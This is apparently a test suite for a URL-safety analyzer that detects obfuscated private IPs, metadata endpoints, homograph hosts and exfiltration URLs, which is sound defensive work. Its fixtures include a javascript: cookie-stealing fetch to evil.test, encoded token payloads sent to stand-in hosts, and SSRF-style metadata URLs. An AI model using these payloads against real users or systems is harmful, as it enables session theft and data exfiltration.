/** URL analysis: where does this actually point, and what is riding along? */

import { describe, expect, it } from "vitest";
import {
  analyze,
  classifyHost,
  ipv4ToString,
  isMetadataHost,
  isPrivateHost,
  parseIpv4,
  splitUrl,
  type AnalyzeOptions,
} from "../src/urlcheck.js";

function categories(url: string, opts: AnalyzeOptions = {}): Set<string> {
  return new Set(analyze(url, opts).findings.map((f) => f.category));
}

// --- IPv4 canonicalization -------------------------------------------------

describe("parseIpv4", () => {
  it("canonicalizes every inet_aton spelling of loopback", () => {
    for (const spelling of ["127.0.0.1", "2130706433", "0177.0.0.1", "0x7f.0.0.1", "127.1", "127.0.1"]) {
      expect(ipv4ToString(parseIpv4(spelling)!), spelling).toBe("127.0.0.1");
    }
  });

  it("rejects non-addresses", () => {
    for (const text of ["1.2.3.4.5", "999.1.1.1", "example.com", "", "1.2.3.4a", "0x"]) {
      expect(parseIpv4(text), text).toBeNull();
    }
  });

  it("reads each component's own base", () => {
    // Decimal, octal, hex and the "0o" literal prefix, mixed freely.
    expect(ipv4ToString(parseIpv4("0300.0250.0.5")!)).toBe("192.168.0.5");
    expect(ipv4ToString(parseIpv4("0xc0.0xa8.0.5")!)).toBe("192.168.0.5");
    expect(ipv4ToString(parseIpv4("0o17.0.0.1")!)).toBe("15.0.0.1");
    expect(parseIpv4("0b11.0.0.1")).toBeNull();
  });

  it("reads digits that are not ASCII", () => {
    // Arabic-Indic and fullwidth digits are decimal digits to the C library
    // and to the reference implementation, so they are here too.
    expect(ipv4ToString(parseIpv4("١٢٧.0.0.1")!)).toBe("127.0.0.1");
    expect(ipv4ToString(parseIpv4("１２７.0.0.1")!)).toBe("127.0.0.1");
  });

  it("rejects digit-shaped characters that carry no decimal value", () => {
    // A superscript or a circled digit is not a digit to the reference
    // implementation, even though it folds to an ASCII digit under NFKC.
    // Accepting them would turn the domain "²" into the address 0.0.0.2.
    for (const text of ["²", "¹.².³.⁴", "①", "①.0.0.1", "0²"]) {
      expect(parseIpv4(text), text).toBeNull();
    }
    expect(classifyHost("²").kind).toBe("domain");
  });

  it("keeps public addresses through canonicalization", () => {
    expect(ipv4ToString(parseIpv4("8.8.8.8")!)).toBe("8.8.8.8");
    expect(isPrivateHost("8.8.8.8")).toBe(false);
  });
});

// --- private and metadata hosts --------------------------------------------

describe("isPrivateHost", () => {
  it("recognizes the private ranges in every spelling", () => {
    for (const host of [
      "127.0.0.1", "2130706433", "10.1.2.3", "192.168.0.5", "172.16.4.4",
      "169.254.1.1", "100.64.0.1", "0.0.0.0", "localhost", "db.internal",
      "printer.local", "mybox", "[::1]", "[fe80::1]", "[fd00::1]",
      "[::ffff:127.0.0.1]",
    ]) {
      expect(isPrivateHost(host), host).toBe(true);
    }
  });

  it("leaves public hosts alone", () => {
    for (const host of ["example.com", "8.8.8.8", "www.reuters.com", "[2606:4700::1111]"]) {
      expect(isPrivateHost(host), host).toBe(false);
    }
  });

  it("is not defeated by a trailing root dot", () => {
    expect(isPrivateHost("localhost.")).toBe(true);
  });
});

describe("isMetadataHost", () => {
  it("singles out the cloud metadata endpoints", () => {
    for (const host of ["169.254.169.254", "metadata.google.internal", "100.100.100.200", "192.0.0.192"]) {
      expect(isMetadataHost(host), host).toBe(true);
    }
    expect(categories("http://169.254.169.254/latest/meta-data/")).toContain("url_metadata_endpoint");
  });
});

describe("analyze", () => {
  it("reports an obfuscated private IP as obfuscated", () => {
    const cats = categories("http://2130706433/admin");
    expect(cats).toContain("url_private_host");
    expect(cats).toContain("url_obfuscated_ip");
  });

  // --- deceptive hosts -----------------------------------------------------

  it("does not let userinfo disguise the destination", () => {
    const a = analyze("https://trusted.example.com@attacker.test/collect");
    expect(a.canonicalHost).toBe("attacker.test");
    expect(a.hasCredentials).toBe(true);
    expect(a.findings.some((f) => f.category === "url_credentials")).toBe(true);
  });

  it("resolves repeated at-signs to the last host", () => {
    expect(analyze("https://a@b@attacker.test/x").canonicalHost).toBe("attacker.test");
  });

  it("flags punycode and mixed-script hosts", () => {
    expect(categories("https://xn--pple-43d.com/login")).toContain("url_punycode");
    expect(categories("https://аpple.com/login")).toContain("url_mixed_script"); // Cyrillic а
  });

  it("names the script it found, including scripts nobody writes any more", () => {
    const [finding] = analyze("https://a\u{12000}.test/").findings;
    expect(finding?.category).toBe("url_mixed_script");
    expect(finding?.message).toContain("CUNEIFORM, LATIN");
    // Two dead scripts in one label is still two scripts.
    expect(categories("https://\u{12000}\u{13000}.test/")).toContain("url_mixed_script");
    expect(categories("https://\u{12000}\u{12001}.test/")).not.toContain("url_mixed_script");
  });

  it("ignores letters the reference implementation cannot name", () => {
    // Tangut ideographs have algorithmic names that CPython's unicodedata does
    // not synthesize, so the reference drops them rather than bucketing them.
    expect(categories("https://a\u{17000}.test/")).not.toContain("url_mixed_script");
    // Tangut *components* are named, so they do count as a second script.
    expect(categories("https://a\u{18800}.test/")).toContain("url_mixed_script");
  });

  it("treats active schemes as critical without double-reporting", () => {
    const cats = categories('javascript:fetch("//evil.test/?d="+document.cookie)');
    expect(cats).toContain("url_active_scheme");
    expect(cats).not.toContain("url_malformed");
  });

  // --- data-carrying URLs --------------------------------------------------

  const BLOB = "eyJjb252ZXJzYXRpb24iOiJzZWNyZXQtdG9rZW4tMTIzNDU2Nzg5MCJ9";

  it("catches a payload in the query, path, fragment and subdomain", () => {
    expect(categories(`https://evil.test/?d=${BLOB}`)).toContain("url_opaque_payload");
    expect(categories(`https://evil.test/${BLOB}`)).toContain("url_opaque_payload");
    expect(categories(`https://evil.test/#${BLOB}`)).toContain("url_opaque_payload");
    expect(categories(`https://${BLOB}.evil.test/`)).toContain("url_opaque_payload");
  });

  it("leaves ordinary URLs clean", () => {
    for (const url of [
      "https://example.com/article",
      "https://www.reuters.com/world/europe/story-2026-07-29/",
      "https://cdn.jsdelivr.net/npm/pkg@1.2.3/dist/index.min.js",
      "https://docs.example.com/guide?utm_source=newsletter&utm_campaign=summer2026",
      "https://api.github.com/repos/o/r/actions/workflows/ci.yml?query=branch%3Amain",
    ]) {
      expect(analyze(url).safe, url).toBe(true);
    }
  });

  it("flags overlong URLs", () => {
    expect(categories("https://evil.test/?d=" + "A".repeat(3000), { maxOpaque: 0 })).toContain("url_length");
  });

  it("holds subdomains to a tighter opaque limit than query strings", () => {
    const run = "A".repeat(30);
    expect(categories(`https://example.com/?t=${run}`)).not.toContain("url_opaque_payload");
    expect(categories(`https://${run}.example.com/`)).toContain("url_opaque_payload");
  });
});

// --- parsing ---------------------------------------------------------------

describe("splitUrl", () => {
  it("handles ports, paths, queries and fragments", () => {
    const u = splitUrl("https://user:pw@example.com:8443/a/b?x=1&y=2#frag");
    expect([u.scheme, u.userinfo, u.host, u.port]).toEqual(["https", "user:pw", "example.com", 8443]);
    expect([u.path, u.query, u.fragment]).toEqual(["/a/b", "x=1&y=2", "frag"]);
  });

  it("keeps an IPv6 literal's brackets and port", () => {
    const u = splitUrl("http://[::1]:9000/x");
    expect(u.host).toBe("[::1]");
    expect(u.port).toBe(9000);
  });

  it("parses bare and scheme-relative values", () => {
    expect(splitUrl("evil.test/path").host).toBe("evil.test");
    expect(splitUrl("//evil.test/path").host).toBe("evil.test");
  });

  it("strips whitespace inside a URL rather than trusting it", () => {
    // Parser differentials start here: one component sees a host, another sees
    // something else. Normalize before classifying.
    expect(splitUrl("http://evil\n.test/x").host).toBe("evil.test");
    expect(splitUrl("http://evil​.test/x").host).toBe("evil.test");
  });

  it("reads a port written in non-ASCII digits", () => {
    // Otherwise the colon survives and the host reads as an IPv6 literal.
    const u = splitUrl("http://example.com:٨٤٤٣/x");
    expect(u.host).toBe("example.com");
    expect(u.port).toBe(8443);
  });
});

describe("classifyHost", () => {
  it("labels the kinds", () => {
    expect(classifyHost("example.com").kind).toBe("domain");
    expect(classifyHost("127.0.0.1").kind).toBe("ipv4");
    expect(classifyHost("[::1]").kind).toBe("ipv6");
    expect(classifyHost("").kind).toBe("empty");
  });
});
